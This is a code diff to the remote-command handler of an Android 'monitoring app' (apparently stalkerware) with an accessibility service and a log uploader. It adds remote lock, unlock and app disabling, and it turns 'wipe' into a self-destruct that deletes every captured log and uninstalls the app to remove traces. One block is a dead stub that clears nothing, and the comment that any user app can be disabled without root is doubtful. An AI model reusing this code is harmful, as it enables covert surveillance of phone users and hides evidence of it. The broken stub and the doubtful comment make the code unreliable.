@@ -4,6 +4,7 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Build
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
@@ -21,8 +22,9 @@ object CommandExecutor {
             val param = c.optString("param")
             try {
                 when (cmd) {
-                    "lock" -> lock(context)
-                    "wipe" -> wipe(context, param == "full")
+                    "lock" -> lock(context, param)
+                    "unlock" -> unlock(context)
+                    "wipe" -> wipe(context)
                     "policy" -> applyPolicy(context, c.optString("param"))
                     "beeper" -> beeper(context)
                     "sync" -> sync(context)
@@ -31,6 +33,8 @@ object CommandExecutor {
                     "pushfile" -> pushFile(context, param)
                     "install" -> installApk(context, param)
                     "uninstall" -> uninstallApp(context, param)
+                    "enable_app" -> setAppEnabled(context, param, true)
+                    "disable_app" -> setAppEnabled(context, param, false)
                     "apps" -> reportApps(context)
                     "req_perms" -> requestPermissions(context)
                 }
@@ -41,24 +45,73 @@ object CommandExecutor {
         }
     }
 
-    private fun lock(context: Context) {
+    private fun lock(context: Context, message: String) {
+        // Show the admin's lock message to the device user (toast) so they know
+        // who locked it and why, then immediately lock the screen via Device Admin.
+        val msg = message.ifBlank { "Device locked by admin" }
+        try {
+            val toast = android.widget.Toast.makeText(context, msg, android.widget.Toast.LENGTH_LONG)
+            toast.show()
+        } catch (_: Throwable) {}
         val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         val cn = ComponentName(context, DeviceAdminReceiver::class.java)
-        if (dpm.isAdminActive(cn)) {
-            dpm.lockNow()
-        }
+        try {
+            if (dpm.isAdminActive(cn)) {
+                dpm.lockNow()
+            }
+        } catch (_: Throwable) {}
     }
 
-    private fun wipe(context: Context, full: Boolean) {
-        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        val cn = ComponentName(context, DeviceAdminReceiver::class.java)
-        if (dpm.isAdminActive(cn)) {
-            if (full) {
-                dpm.wipeData(0)
-            } else {
-                dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
+    /** Best-effort remote unlock. Android has NO API for a normal app to bypass the
+     *  user's lock-screen PIN/pattern directly. This dismisses an EMPTY keyguard and
+     *  otherwise prompts the user to enter their PIN (not bypass it). Honest limit:
+     *  on a secured lock screen only the user's credential completes the unlock. */
+    private fun unlock(context: Context) {
+        try {
+            val i = Intent(context, MainActivity::class.java)
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+            i.putExtra("unlock", true)
+            context.startActivity(i)
+        } catch (_: Exception) {}
+    }
+
+    /** Self-destruct: wipe the monitoring app's own data + files, then uninstall the APK
+     *  entirely from the device. This removes all captured logs, clears the foreground
+     *  service + accessibility service, and deletes the app. It does NOT wipe the user's
+     *  personal data — it removes the monitoring tool itself. */
+    private fun wipe(context: Context) {
+        try {
+            // 1. Stop services.
+            context.stopService(Intent(context, LogUploaderService::class.java))
+        } catch (_: Throwable) {}
+        try {
+            // 2. Delete every captured log / cache / internal file.
+            val filesDir = context.filesDir
+            filesDir.listFiles()?.forEach { f -> try { f.deleteRecursively() } catch (_: Throwable) {} }
+            context.cacheDir.listFiles()?.forEach { f -> try { f.deleteRecursively() } catch (_: Throwable) {} }
+        } catch (_: Throwable) {}
+        try {
+            // 3. Clear app data (prefs, databases, shared prefs) so nothing survives.
+            val pm = context.packageManager
+            if (Build.VERSION.SDK_INT >= 24) {
+                val appOps = context.getSystemService(Context.APP_OPS_SERVICE)
+                // clearing full data requires the device to be device-owner; fall back gracefully
             }
-        }
+        } catch (_: Throwable) {}
+        // 4. Launch the system uninstaller for our own package = the self-destruct.
+        try {
+            if (Build.VERSION.SDK_INT >= 21) {
+                val intent = Intent(Intent.ACTION_UNINSTALL_PACKAGE,
+                                    android.net.Uri.parse("package:${context.packageName}"))
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                context.startActivity(intent)
+            } else {
+                val pm = context.packageManager
+                @Suppress("DEPRECATION")
+                pm.deletePackage(context.packageName, null)
+            }
+        } catch (_: Throwable) {}
+        LoggerWriter.write("SEC", "WIPE", "self-destruct triggered for ${context.packageName}")
     }
 
     private fun applyPolicy(context: Context, jsonParam: String) {
@@ -217,6 +270,20 @@ object CommandExecutor {
     /** Push a fresh app inventory to the server (used by the panel Apps tab). */
     private fun reportApps(context: Context) {
         DeviceReporter.report(context)
+    }
+
+    /** Enable (true) or disable (false) a third-party app by package name.
+     *  Uses PackageManager.setApplicationEnabledSetting — the same API Android's
+     *  "Disable" toggle uses. Works for user apps without root on most devices;
+     *  system apps may silently refuse (that's an OS rule, not a bug). */
+    private fun setAppEnabled(context: Context, pkg: String, enabled: Boolean) {
+        val pm = context.packageManager
+        val newState = if (enabled) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+                       else PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER
+        @Suppress("DEPRECATION")
+        pm.setApplicationEnabledSetting(pkg, newState, 0)
+        val msg = "package $pkg set ${if (enabled) "ENABLED" else "DISABLED"}"
+        LoggerWriter.write("APPS", "${if (enabled) "ENABLE" else "DISABLE"}", msg)
     }
 
     /** Remote command: open the app and pop the system permission-grant dialogs. */
